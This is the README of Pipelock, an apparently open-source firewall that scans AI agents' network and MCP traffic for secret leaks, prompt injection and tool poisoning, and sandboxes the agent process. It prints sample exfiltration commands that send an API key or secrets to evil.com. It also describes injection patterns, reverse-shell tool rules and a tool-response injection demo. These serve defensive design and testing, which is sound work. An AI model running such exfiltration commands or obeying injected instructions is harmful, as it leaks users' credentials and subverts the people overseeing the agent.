**Open-source AI agent firewall with mediator-signed [action receipts](https://pipelab.org/learn/action-receipt-spec/) from outside the agent trust boundary.** Network scanning, process containment, MCP-aware policy enforcement, and independently verifiable proof of what your agent did in a single binary. Learn more: [Open-source AI firewall](https://pipelab.org/learn/open-source-ai-firewall/).

**Agent-external attestation built in.** Receipts are signed by the mediator, outside the agent process and outside its credentials, so evidence does not depend on the agent attesting to itself.

**Covers MCP security, agent egress security, DLP for AI agents, and prompt injection defense.** Pipelock acts as an agent egress proxy for outbound HTTP, WebSocket, and MCP traffic, with bidirectional MCP scanning, 48 credential patterns, and 25 injection patterns with 6-pass normalization.

**Works with:** Claude Code · Cursor · VS Code · JetBrains · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph

[Quick Start](#quick-start) · [What It Does](#what-it-does) · [Docs](docs/) · [Blog](https://pipelab.org/blog/) · [Ask Dosu](https://app.dosu.dev/bcccd1cf-be85-4c0e-ae05-edeb0ff50b59/ask)

## The Problem

Your AI agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
```

Every machine action your agent takes (HTTP requests, tool calls, browser sessions) crosses a boundary between your secrets and the open internet. Pipelock sits at that boundary. It scans every outbound and inbound request, blocks exfiltration and injection, sandboxes the agent process, and generates signed evidence of what happened.

## What It Does

Pipelock is an [AI egress proxy](https://pipelab.org/learn/ai-egress-proxy/) and [MCP security control](https://pipelab.org/learn/mcp-security/): it sits inline between your AI agent and the network, scans outbound and inbound traffic, and emits signed receipts plus mediation metadata for independent attestation.

### 11-Layer URL Scanner

Every request passes through: scheme validation, CRLF injection detection, path traversal blocking, domain blocklist, DLP pattern matching (48 built-in patterns for API keys, tokens, credentials, cryptocurrency keys, environment variable secrets, and financial identifiers with checksum validation), path entropy analysis, subdomain entropy analysis, SSRF protection with DNS rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets.

DLP runs before DNS resolution, designed to catch secrets before any DNS query leaves the proxy. BIP-39 seed phrase detection uses a dedicated scanner with dictionary lookup, sliding window matching, and SHA-256 checksum validation to catch cryptocurrency mnemonic exfiltration across all transport surfaces.

See [docs/bypass-resistance.md](docs/bypass-resistance.md) for the full evasion test matrix.

### Process Sandbox

Unprivileged process containment using OS-native kernel primitives. On Linux: Landlock LSM restricts filesystem access, seccomp filters dangerous syscalls, and network namespaces force all traffic through pipelock's scanner (no direct egress). On macOS: sandbox-exec profiles restrict filesystem and network. In containers, use `--best-effort` for Landlock + seccomp containment when namespace creation is restricted (network scanning uses proxy-based routing instead of kernel enforcement).

```bash
pipelock sandbox --config pipelock.yaml -- python agent.py
pipelock sandbox --best-effort -- python agent.py  # containers
pipelock mcp proxy --sandbox --config pipelock.yaml -- npx server
```

### Response Scanning

Fetched content is scanned for prompt injection and state/control poisoning before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. 25 built-in patterns cover jailbreak phrases, instruction manipulation, credential solicitation, memory persistence, preference poisoning, covert action directives, model instruction boundaries, and CJK-language instruction overrides. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).

`text/event-stream` responses (OpenAI chat completions, Anthropic messages, Kilo Gateway, MCP HTTP/SSE) stream through with per-event DLP and injection scanning so token-by-token LLM chat UX is preserved while body scanning stays on. Clean events flush immediately; a detection terminates the stream fail-closed. Compressed SSE streams are rejected since compressed bytes evade regex matching. See [SSE streaming guide](docs/guides/sse-streaming.md).

### Request Redaction

Optional request-side redaction rewrites matched JSON values before they leave the agent. The same matcher covers HTTP request bodies, outbound WebSocket client messages, and MCP `tools/call` `params.arguments` across stdio, HTTP/SSE, and WebSocket transports. Replacements are typed placeholders such as `<pl:aws-access-key:1>`, and signed action receipts record only the active profile plus per-class counts.

### MCP Proxy

Wraps any MCP server with bidirectional scanning. Three transport modes: stdio subprocess wrapping, Streamable HTTP bridging, and HTTP reverse proxy. Scans both directions: client requests checked for DLP leaks, server responses scanned for injection, and `tools/list` responses checked for poisoned descriptions and mid-session rug-pull changes.

```bash
# Wrap a local MCP server (stdio)
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# Proxy a remote MCP server (HTTP)
pipelock mcp proxy --upstream http://localhost:8080/mcp

# Combined mode (fetch/forward proxy + MCP on separate ports)
pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp
```

### MCP Tool Policy

Pre-execution rules that block dangerous tool calls before they reach MCP servers. Ships with 17 built-in rules covering destructive operations, credential access, reverse shells, persistence mechanisms, and encoded command execution. Shell obfuscation detection is built-in. v2.0 adds a `redirect` action that routes dangerous operations through audited wrappers instead of blocking outright.

### Tool Call Chain Detection

Detects attack patterns in sequences of MCP tool calls. Ships with 10 built-in patterns covering reconnaissance, credential theft, data staging, persistence, and exfiltration chains. Uses subsequence matching with configurable gap tolerance, so inserting innocent calls between attack steps doesn't evade detection.

### Kill Switch

Emergency deny-all with four independent activation sources: config file, SIGUSR1, sentinel file, and remote API. Any one active blocks all traffic. The API can run on a separate port so agents can't deactivate their own kill switch.

```bash
# Activate from operator machine
curl -X POST http://localhost:9090/api/v1/killswitch \
  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
```

### Scan API

Evaluation endpoint for programmatic scanning. Any tool, pipeline, or control plane can submit URLs, text, or tool calls and get a structured verdict back (the proxy doesn't need to be in the request path). Four scan kinds: `url`, `dlp`, `prompt_injection`, and `tool_call`. Returns findings with scanner type, rule ID, and severity. Bearer token auth, per-token rate limiting, and Prometheus metrics.

See [docs/scan-api.md](docs/scan-api.md) for the full API reference.

### Address Protection

Detects blockchain address poisoning attacks where a lookalike address is substituted for a legitimate one. Validates addresses for ETH, BTC, SOL, and BNB chains, compares against a user-supplied allowlist, and flags similar addresses using prefix/suffix fingerprinting. Designed for agents that interact with DeFi protocols or execute transactions.

### Filesystem Sentinel

Monitors agent working directories for secrets written to disk. When an MCP subprocess writes a file containing credentials, pipelock detects it using the same DLP patterns applied to network traffic. On Linux, process lineage tracking attributes file writes to the agent's process tree. See [docs/guides/filesystem-sentinel.md](docs/guides/filesystem-sentinel.md).

### Event Emission

Forward audit events to external systems (SIEM, webhook receivers, syslog). Events are fire-and-forget and never block the proxy. Each event includes a MITRE ATT&CK technique ID where applicable (T1048 for exfiltration, T1059 for injection, T1195.002 for supply chain).

See [docs/guides/siem-integration.md](docs/guides/siem-integration.md) for log schema, forwarding patterns, and example SIEM queries.

### Security Assessment

`pipelock assess` runs a four-stage security assessment against your deployment: attack simulation (20 scenarios across DLP, injection, tool poisoning, and URL evasion), config audit (12 categories scored 0-100), deployment verification (live probe of scanning and containment), and MCP server discovery (protection status across Claude Code, Cursor, VS Code, and other clients).

Critical exposures like unprotected MCP servers cap the grade regardless of numeric score.

```bash
pipelock assess init --config pipelock.yaml
pipelock assess run assessment-a1b2c3d4/
pipelock assess finalize assessment-a1b2c3d4/
```

The free summary shows your grade, section scores, and top findings. Licensed users get the full report with server-specific findings, remediation commands, and Ed25519-signed evidence.

![Pipelock Security Summary showing grade C (79/100) with compliance coverage, MCP protection, and detection scoring](docs/assets/assess-summary.png)

### Flight Recorder

Hash-chained JSONL evidence log with Ed25519-signed checkpoints and DLP redaction. Every proxy decision is recorded as a tamper-evident entry linked to the previous one. Action receipts provide cryptographically signed proof of each mediated action (what happened, what the verdict was, which policy was active), and request-side rewrites add a compact `redaction` summary block instead of storing plaintext secrets. Verify any receipt independently with `pipelock verify-receipt`.

### Canary Tokens

Synthetic secrets injected into the agent's environment. If pipelock detects a canary in outbound traffic, it proves the agent (or something in its chain) is exfiltrating environment variables. Ships with `pipelock canary` to generate config snippets.

### More Features

| Feature | What It Does |
|---------|-------------|
| **Audit Reports** | `pipelock report --input events.jsonl` generates HTML/JSON reports with risk rating, timeline, and evidence appendix. Ed25519 signing with `--sign`. ([Sample report](examples/sample-report.html)) |
| **Diagnose** | `pipelock diagnose` runs 7 local checks to verify your config works end-to-end (no network required) |
| **TLS Interception** | Optional CONNECT tunnel MITM: decrypt, scan bodies/headers/responses, re-encrypt. `pipelock tls init` generates a CA, then `pipelock tls install-ca` trusts it system-wide. |
| **Block Hints** | Opt-in `explain_blocks: true` adds fix suggestions to blocked responses |
| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
| **Config Scoring** (v2.0) | `pipelock audit score --config pipelock.yaml` evaluates security posture across 12 categories (0-100 with letter grade). Flags overpermissive tool policies. |
| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files |
| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before they're committed |
| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |

| **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
| **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
| **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |
| **A2A Scanning** | Agent Card poisoning detection, card drift monitoring, session smuggling prevention for Google's Agent-to-Agent protocol |
| **Behavioral Baseline** | Profile-then-lock for MCP tool behavior. Learns normal patterns during a window, flags deviations after ratification. |
| **Denial-of-Wallet** | Per-agent budgets for retries, fan-out, and concurrent tool calls. Catches loop storms and amplification attacks. |
| **Taint Escalation** | Exposure-based policy escalation across MCP + task boundaries. Sessions that recently observed untrusted content get elevated scanning on protected operations until trust is explicitly restored. |
| **Mediation Envelope** | RFC 8941 sideband metadata on forwarded HTTP requests and MCP `_meta`, carrying action type, verdict, actor identity, policy hash, taint context, and receipt correlation ID. v2.4 adds inbound verification with replay protection, SPIFFE actor format, and an RFC 9421 well-known signing-key directory at `/.well-known/http-message-signatures-directory`. See [federation guide](docs/guides/federation.md). |
| **Receipt Conformance** | Cross-implementation receipt verification suite (`sdk/conformance/`) plus the reference Python verifier ([pipelock-verify-python](https://github.com/luckyPipewrench/pipelock-verify-python)), so receipts can be verified outside the Go implementation. v2.4 adds `EvidenceReceipt v2` for learn-and-lock lifecycle and shadow evidence; the Go reference verifies v2 receipts today, and a prepared `pipelock-verify-python` 0.2.0 update adds v1 chains plus individual v2 receipts once published. v2 chain verification remains a follow-up. |
| **Learn-and-Lock** (v2.4) | Per-agent behavioral contracts: observe an agent's real traffic, compile a signed candidate contract, replay captured observations in shadow, ratify per rule, promote the signed active manifest, and **enforce live** on every URL-bearing transport plus the MCP tool-call surface (forward, reverse + redirect, intercept, /fetch, WebSocket, MCP HTTP, MCP stdio bridge, MCP stdio subprocess). Lifecycle, shadow, and runtime `proxy_decision` receipts use `EvidenceReceipt v2`, chained to the active manifest hash. Scanner block always wins over contract allow on every gated path. See [learn-and-lock guide](docs/guides/learn-and-lock.md). |
| **Block-Reason Header** (v2.4) | `X-Pipelock-Block-Reason` response header on every HTTP-capable block path (forward / intercept / fetch / reverse / MCP HTTP / WebSocket close-frame payload) with a fixed reason vocabulary, severity tier, and retry hint. MCP-internal JSON-RPC blocks (`tool_poisoning`, `tool_chain_blocked`, MCP stdio) carry the same reason vocabulary on the JSON-RPC error metadata where there is no HTTP response surface. Lets agents react intelligently to a block without parsing the body. See [block-reason header](docs/guides/block-reason-header.md). |
| **Wedge-Detection Watchdog** (v2.4) | `health_watchdog` returns `/health` 503 when a subsystem heartbeat goes stale (proxy hot path, MCP listeners, rules-engine reload watcher), so cluster liveness probes detect a wedged scanner automatically. Optional `expose_subsystems: true` adds a per-subsystem map for operator dashboards. See [health endpoint guide](docs/guides/health.md). |
| **Redaction Provider Plugin Shape** (v2.4) | First-party redaction parsers ship for Anthropic, OpenAI, and Gemini chat APIs. The provider-plugin shape (`internal/redact/providers.go::DefaultProviderSpecs()`) lets a third-party LLM provider register a body parser without forking the redact package. Wired through forward / intercept / reverse / WebSocket transports. |
| **Media Policy** | Controls media response handling: strips steganographic metadata from JPEG/PNG (byte-level surgery, pixel-identical output), rejects audio/video by default, hardens SVG active content (foreignObject, event handlers, external hrefs), and enforces image size limits against decompression bombs. |
| **Compliance Mappings** | OWASP MCP Top 10, OWASP Agentic Top 15, NIST 800-53, EU AI Act, SOC 2 coverage documentation |

## How It Works

Pipelock uses **capability separation**: the agent process has secrets but no direct network access. Pipelock has network access but no agent secrets. Even if the agent gets prompt-injected, it can't reach the firewall's controls.

Three HTTP proxy modes (same port), plus dedicated MCP and A2A proxies:

- **Fetch proxy** (`/fetch?url=...`): Fetches the URL, extracts text, scans for injection, returns clean content.
- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling. Zero code changes. Optional TLS interception for full payload scanning.
- **WebSocket proxy** (`/ws?url=ws://...`): Bidirectional frame scanning with DLP + injection detection.
- **MCP proxy** (`pipelock mcp proxy`): Wraps stdio or HTTP MCP servers with bidirectional scanning.
- **A2A proxy**: Inspects Google Agent-to-Agent protocol traffic.

## Security Matrix

Pipelock runs in three modes:

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Allowlist-only | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

For agents running uncensored or abliterated models (e.g. OBLITERATUS), the [`hostile-model` preset](configs/hostile-model.yaml) layers additional defenses on top of strict mode: aggressive entropy thresholds (3.0), blanket network tool blocking, session binding, cross-request exfiltration detection, and a pre-configured kill switch. `pipelock audit` recommends this preset when it detects known guardrail-removal toolchains (currently dependency-based detection).

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`), pipelock adds OS-level containment (Landlock + network namespaces + seccomp) on top of content inspection. The agent can't bypass the proxy because it has no direct network access.

## Configuration

Generate a config from one of three CLI presets, or let `pipelock audit` tailor one to your project:

```bash
pipelock generate config --preset balanced > pipelock.yaml
pipelock audit ./my-project -o pipelock.yaml
```

| CLI Preset | Mode | Action | Best For |
|------------|------|--------|----------|
| `balanced` | balanced | warn | General purpose (default) |
| `strict` | strict | block | High-security, regulated industries |
| `audit` | audit | warn | Log-only evaluation |

Four additional preset files ship in `configs/` for specific workflows:

| File | Mode | Best For |
|------|------|----------|
| `configs/claude-code.yaml` | balanced | Claude Code unattended |
| `configs/cursor.yaml` | balanced | Cursor IDE |
| `configs/generic-agent.yaml` | balanced | New agents (tuning phase) |
| `configs/hostile-model.yaml` | strict | Uncensored/abliterated models |

Config changes are picked up automatically via file watcher or SIGHUP. Full reference: **[docs/configuration.md](docs/configuration.md)**

The [`examples/tool-response-injection/`](examples/tool-response-injection/) harness runs an end-to-end demo where an MCP tool with a harmless name and description hides a prompt-injection payload in its response. Pipelock blocks the response before it reaches the agent and emits signed action receipts that a third party can verify. The same demo runs against three transports with one shared signing key:

- MCP stdio (subprocess wrapping)
- MCP HTTP upstream (stdio-to-HTTP bridge)
- MCP HTTP reverse proxy

```bash
cd examples/tool-response-injection
python3 demo.py    # needs python3 + cryptography + pipelock on PATH
```

## Community Rules

Signed rule bundles add detection patterns beyond the 48 built-in defaults. 28 community rules across DLP, injection, and tool-poison categories:

```bash
pipelock rules install pipelock-community
```

See [docs/rules.md](docs/rules.md) for details.

## Testing

Pipelock is tested like a security product. The open-source core has thousands of unit, integration, and end-to-end tests. A separate private adversarial suite exercises real-world attack classes against the production binary. Every bypass graduates into a regression test before release.

| Metric | Value |
|--------|-------|
| Go tests (with `-race`) | Thousands across unit, integration, and end-to-end paths |
| Statement coverage | 88%+ |
| Evasion techniques tested | 230+ |
| Scanner pipeline overhead | ~40us per URL scan |
| CI matrix | Go 1.25 + 1.26, CodeQL, golangci-lint |
| Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |

Run `make test` to verify locally. Independent benchmark: the public [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) corpus. See the [live results](https://pipelab.org/gauntlet/).
